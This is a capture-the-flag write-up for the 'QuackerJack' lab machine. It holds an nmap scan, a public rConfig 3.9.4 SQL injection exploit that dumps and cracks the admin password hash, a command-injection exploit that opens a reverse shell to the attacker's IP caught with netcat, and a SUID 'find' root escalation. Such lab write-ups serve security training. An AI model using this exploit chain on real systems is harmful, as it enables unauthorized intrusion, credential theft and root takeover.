# QuackerJack

### Nmap
```
# Nmap 7.94SVN scan initiated Sun Apr 27 22:51:56 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -p- -v -o target_nmap.txt 192.168.191.57
Nmap scan report for 192.168.191.57
Host is up (0.074s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.162
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-title: 400 Bad Request
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|5.X (91%), Crestron 2-Series (86%), HP embedded (85%), Oracle VM Server 3.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:3.13 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:oracle:vm_server:3.4.2 cpe:/o:linux:linux_kernel:4.1
Aggressive OS guesses: Linux 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.2 - 4.9 (90%), Linux 5.1 (90%), Linux 3.18 (87%), Crestron XPanel control system (86%), Linux 3.16 (86%), HP P2000 G3 NAS device (85%), Oracle VM Server 3.4.2 (Linux 4.1) (85%), Linux 4.4 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.001 days (since Sun Apr 27 22:54:06 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: QUACKERJACK; OS: Unix
```
### Check the web service on port 8081

The version found is **rConfig 3.9.4**
![](/writeups/screenshot/Screenshot%202025-04-28%20at%2011.32.00.png)

Search exploits
```
┌──(kali㉿kali)-[~/Desktop/PG/QuackerJack]
└─$ searchsploit rConfig 3.9.4
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
rConfig 3.9 - 'searchColumn' SQL Injection                                                                                | php/webapps/48208.py
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection                                                                | php/webapps/48241.py
rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution                                                  | php/webapps/48261.py
Rconfig 3.x - Chained Remote Code Execution (Metasploit)                                                                  | linux/remote/48223.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Using the exploit of 'searchColumn' SQL Injection 
```
┌──(kali㉿kali)-[~/Desktop/PG/QuackerJack]
└─$ python3 48208.py https://192.168.191.57:8081
/home/kali/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://192.168.191.57:8081/commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:4e9f8e413065db3ccb08d4e064381f2b
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
[+] Extracting 10 first devices :
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Done
```
MD5 Decryption

```
admin:1:4e9f8e413065db3ccb08d4e064381f2b
admin:1:Testing1@
```

### Using the exploit of 'searchField' Unauthenticated Root Remote Code 
```
┌──(kali㉿kali)-[~/Desktop/PG/QuackerJack]
└─$ python3 48241.py https://192.168.191.57:8081 admin Testing1@ 192.168.45.162 80
/home/kali/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
```

### Get the reverse shell and get `local.txt`
```
bash-4.2$ cat /home/rconfig/local.txt
cat /home/rconfig/local.txt
```

### Privilege Escalation

find `SUID`

```
bash-4.2$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/find
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

Using `find` to privilege escalation

```
┌──(kali㉿kali)-[~/Desktop/PG/QuackerJack]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.162] from (UNKNOWN) [192.168.191.57] 38320
bash-4.2$ find . -exec /bin/sh -p \; -quit      
find . -exec /bin/sh -p \; -quit
id
uid=48(apache) gid=48(apache) euid=0(root) groups=48(apache)
cd /root
pwd
/root
ls
proof.txt
cat proof.txt
```